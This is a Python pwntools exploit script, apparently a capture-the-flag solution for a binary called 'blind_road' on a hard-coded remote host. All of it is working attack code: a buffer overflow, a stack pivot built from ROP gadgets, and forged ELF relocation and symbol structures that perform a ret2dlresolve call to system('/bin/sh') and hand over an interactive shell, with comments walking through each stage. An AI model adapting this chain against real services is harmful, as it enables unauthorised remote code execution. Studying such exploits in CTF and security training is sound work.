# -*- coding: utf-8 -*-
# @Author: madrat
# @Date:   2019-08-06 09:56:40

from pwn import *

pop_r13_r14_r15_ret = 0x4005be
pop_rsi_r15_ret     = 0x4005d1
mov_rsi_ptr_rsi     = 0x40054F
mov_rdx_0x8         = 0x400547
add_rsi_rdi         = 0x400553
pop_rbp_ret         = 0x400490
pop_rdi_ret         = 0x4005d3
leave_ret           = 0x400545
ret                 = 0x4003e1

dl_resolver = 0x4003F0

# pop rbx == 0
# pop rbp == 1
# pop r12 = ptr to fnc
# pop r13 = rdx
# pop r14 = rsi
# pop r15 = edi
libc_csu_init = 0x4005CA # initialize registers
libc_csu_call = 0x4005B0 # call function using "call qword ptr [r12+rbx*8]" + place appropriate arguments 

REL_PLT = 0x400398
SYMTAB  = 0x4002B8
STRTAB  = 0x400318

LINKMAPPTR = 0x601008
linkmapoffset = 0x1c8

read_write_buf  = 0x601460 + 0x200
offset = 116 + 4

fname = '../deploy/service/blind_road'

local = False

elf = ELF(fname)
if local:
    ps = process(fname)
else:
    ps = remote('78.140.221.65', 25048)

# pivot stack to controlled area
# read second stage
def first_stage(addr):
    log.info('Starting first stage')
    log.info('- Make call to read (to get second and third stage chains) and pivot stack to .data segment')
    payload = 'A' * offset    

    log.info('Prepaing arguments for libc_csu_init')
    payload += p64(libc_csu_init)   # arguments-place gadget
    payload += p64(0x0)             # RBX
    payload += p64(0x1)             # RBP
    payload += p64(elf.got['read']) # r12, ptr to fnc
    payload += p64(0x200)           # r13 = rdx
    payload += p64(addr)            # r14 = rsi
    payload += p64(0x0)             # r15 = edi
    payload += p64(libc_csu_call)   # call function

    log.info('Clean-up after call to read using libc_csu_init')
    payload += p64(0x0)  # junk
    payload += p64(0x0)  # rbx
    payload += p64(addr) # rbp, data segment, where we can save fake structs
    payload += p64(0x0)  # r12
    payload += p64(0x0)  # r13
    payload += p64(0x0)  # r14
    payload += p64(0x0)  # r15

    payload += p64(leave_ret)    # make rsp -> read_write_buf
    payload += p64(0x13371338)   # junk

    ps.send(payload) # first read

    log.info('First stage - OK')

# make *(LINKMAPPTR+0x1c8) = 0x0
def second_stage():
    log.info('Starting second stage')
    log.info('- Make second call to read, to place 0x0 at dt_versym, or we will get SIGSEGV')

    # set dt_versym to 0x0 
    payload = 'AAAAAAAA'
    payload += p64(pop_rsi_r15_ret)
    payload += p64(LINKMAPPTR)
    payload += p64(0xdeadbeef)
    payload += p64(mov_rsi_ptr_rsi)
    payload += p64(pop_rdi_ret)
    payload += p64(linkmapoffset)
    payload += p64(add_rsi_rdi)

    payload += p64(pop_rdi_ret)
    payload += p64(0x0)
    payload += p64(mov_rdx_0x8)
    payload += p64(elf.plt['read']) # call read to place 0x0 

    log.info('Setting up arguments for system')
    # place argument for system
    payload += p64(pop_rdi_ret)
    payload += p64(0x601738 + 8)    # "/bin/sh" address

    log.info('Second stage - OK')

    '''
struct Elf64_Rela 
{
  unsigned __int64 r_offset = .GOT;
  unsigned __int64 r_info   = 0x155e700000007;
  __int64 r_addend          = 0x0;
};

struct __attribute__((aligned(8))) Elf64_Sym // struct_size: 24 bytes
{
  unsigned __int32 st_name;  // 4 bytes
  unsigned __int8  st_info;  // 1 byte
  unsigned __int8  st_other; // 1 byte
  unsigned __int16 st_shndx; // 2 bytes
  unsigned __int64 st_value; // 8 bytes
  unsigned __int64 st_size;  // 8 bytes 
};

rdi - ptr to '/bin/sh' 

        +------------------+
        |                  |
0x0     |   .GOT['read']   | Elf64_Rela->r_offset
0x8     | 0x01561600000007 | Elf64_Rela->r_info
0x10    |       0x00       | Elf64_Rela->r_addend
0x18    |     0x200d48     | Elf64_Sym->st_name
0x20    |       0x00       | Elf64_Sym->st_info
0x28    |       0x00       | Elf64_Sym->st_other
0x30    |       0x00       | Elf64_Sym->st_shndx
0x38    |       0x00       | Elf64_Sym->st_value
0x40    |       0x00       | Elf64_Sym->st_size
0x48    |   "system\x00"   | string for st_name
0x50    |  "/bin/sh\x00"   | parameter to system
        +------------------+
    '''

    log.info('Starting third stage')
    log.info('- Forge linker structures (Elf64_Rela, Elf64_Sym). Return to dl-resolve.')

    Elf64_Rela = p64(elf.got['read']) + p64(((0x1562f << 32) | 0x7)) + p64(0x0)
    Elf64_Sym  = p32(0x201420) + p8(0x0) + p8(0x0) + p16(0x0) + p64(0x0) + p64(0x0)

    payload += p64(dl_resolver) # ret to dl-resolve
    payload += p64(0x15624)  # REL_PLT Elf64_Rela (0x400398 + idx * 24 == Elf64_Rela), at 0x6016f8
    payload += p64(0xdeadbeef)  # fake ret
    payload += 'AAAAAAAAAAAAAAAA'
    payload += Elf64_Rela       # Elf64_Rela struct at 0x6016f8
    payload += 'AAAAAAAAAAAAAAAA'
    payload += Elf64_Sym        # Elf64_Sym  struct at 0x601720
    payload += 'system\x00A'    # parameter to dl-resolver at 0x601738
    payload += '/bin/sh\x00'    # parameter to system      at 0x601740

    ps.send(payload)  # second read
    # gdb.attach(ps)

    log.info('Third stage - OK')

    ps.send(p64(0x0)) # third read (null linkmap)  

    log.info('Here is your shell: ')
    ps.interactive()


'''
full chain:
    1. extract linkmap address (from .got.plt + 0x8)
    2. make *(linkmap+0x1c8) = 0x0 (using read: 0x40052e, $rbp must be 0x601080)
    3. call read with "fake stack" parameter.
    4. write second-stage payload to stack
    5. place appropriate arguments for system()
    6. forge Elf64_Rela and Elf64_Sym structs
    7. call dl-resolve with appropriate offset for Elf64_Rela
    8. get shell 
'''

def main():
    log.info('.rel.plt (JMPREL) at: 0x%x' % REL_PLT)
    log.info('.symtab  (SYMTAB) at: 0x%x' % SYMTAB)
    log.info('.strtab  (STRTAB) at: 0x%x' % STRTAB)
    log.info('Fake stack at: 0x%x' % read_write_buf)

    first_stage(read_write_buf)
    second_stage()

if __name__ == "__main__":
    main()